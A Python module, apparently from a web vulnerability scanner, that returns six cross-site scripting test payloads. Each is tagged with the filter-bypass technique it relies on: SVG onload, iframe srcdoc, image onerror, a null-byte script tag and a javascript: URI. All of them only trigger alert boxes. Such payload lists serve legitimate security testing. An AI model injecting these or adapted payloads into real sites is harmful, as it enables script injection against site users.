# modules/xss.py

def get_xss_payloads():
    payloads = [
        {
            "type": "Reflected XSS",
            "payload": "<script>alert(1)</script>",
            "bypass": "Basic script tag"
        },
        {
            "type": "SVG Bypass",
            "payload": "<svg/onload=alert(1)>",
            "bypass": "Using SVG element to trigger JS"
        },
        {
            "type": "Srcdoc Iframe",
            "payload": '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            "bypass": "Using iframe srcdoc to embed script"
        },
        {
            "type": "Image OnError",
            "payload": '<img src=x onerror=alert(1)>',
            "bypass": "JS event handler on image"
        },
        {
            "type": "Null Byte Trick",
            "payload": "<script%00>alert(1)</script>",
            "bypass": "Using null byte to bypass filters"
        },
        {
            "type": "DOM-based XSS",
            "payload": "javascript:alert(document.domain)",
            "bypass": "Triggered through vulnerable JS context"
        }
    ]
    return payloads

